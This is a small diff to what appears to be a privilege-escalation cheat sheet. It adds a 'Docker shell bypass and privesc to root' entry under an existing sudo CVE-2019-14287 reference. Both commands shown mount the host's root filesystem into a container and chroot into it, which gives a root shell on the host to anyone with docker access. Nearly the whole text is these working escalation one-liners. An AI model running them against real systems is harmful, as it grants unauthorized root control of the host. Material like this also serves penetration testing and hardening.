@@ -9,3 +9,9 @@ Read more: [https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/](
 ```bash
 docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/bash
 ```
+
+Docker shell bypass and privesc to root
+
+```bash
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+```
